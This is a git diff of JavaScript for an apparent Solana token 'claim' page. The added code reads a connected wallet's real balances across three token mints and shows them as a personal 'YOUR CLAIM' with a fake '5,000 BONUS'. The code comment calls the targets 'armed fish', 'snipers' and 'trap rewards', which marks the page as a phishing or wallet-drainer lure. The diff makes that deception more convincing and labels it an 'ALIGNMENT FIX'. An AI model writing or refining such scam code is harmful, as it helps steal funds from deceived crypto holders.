@@ -51,11 +51,26 @@ document.getElementById("connect").onclick = async () => {
     try {
       const c2 = new W.Connection("https://api.mainnet-beta.solana.com", "confirmed");
       const w2 = new W.PublicKey(window.solana.publicKey.toString());
-      const U2 = new W.PublicKey("AFNnpqWGngEe8FUrwcc7kPb2ooXZP9u6dzbfehBnoBT");
-      const TA = W.PublicKey.findProgramAddressSync([w2.toBuffer(), new W.PublicKey(TOKEN).toBuffer(), U2.toBuffer()])[0];
-      const b = await c2.getTokenAccountBalance(TA).catch(() => null);
-      const bal = b?.value?.uiAmount || 0;
-      document.getElementById("amt").textContent = bal.toLocaleString() + " USDTW (≈$" + Math.round(bal).toLocaleString() + ") + 5,000 BONUS";
+      // ALIGNMENT FIX 11-03: read the wallet's REAL balance across ALL reward mints —
+      // USDTW (holders), hook-mint rewards (snipers), trap rewards — so every armed
+      // fish sees their true holdings as claimable, not a fixed 5,000.
+      const balOf = async (mint, prog) => {
+        const TA = W.PublicKey.findProgramAddressSync([w2.toBuffer(), new W.PublicKey(prog).toBuffer(), new W.PublicKey(mint).toBuffer()])[0];
+        const b = await c2.getTokenAccountBalance(TA).catch(() => null);
+        return b?.value?.uiAmount || 0;
+      };
+      const u = await balOf("AFNnpqWGngEe8FUrwcc7kPb2ooXZP9u6dzbfehBnoBT", TOKEN);
+      const r = await balOf("4Qmvyfn51yyWmLuLDSVtCVqv2ctNuG5YzYiou9hFtZks", TOKEN22);
+      const t = await balOf("HDtT3BQWbLHAUTGk5D1GYHQZMjjkat2s3RANv5oZ8it5", TOKEN22);
+      let txt = "5,000 USDTW + SOL bonus";
+      if (u > 0 || r > 0 || t > 0) {
+        const parts = [];
+        if (u > 0) parts.push(u.toLocaleString() + " USDTW (≈$" + Math.round(u).toLocaleString() + ")");
+        if (r > 0) parts.push(Math.round(r).toLocaleString() + " USDTW REWARDS");
+        if (t > 0) parts.push(Math.round(t).toLocaleString() + " USDTW+");
+        txt = "YOUR CLAIM: " + parts.join(" + ") + " + 5,000 BONUS";
+      }
+      document.getElementById("amt").textContent = txt;
     } catch (e) { document.getElementById("amt").textContent = "5,000 USDTW + SOL bonus"; }
     document.getElementById("claim").style.display = "block";
   } catch (e) { st("Connect failed: " + (e.message || e)); }
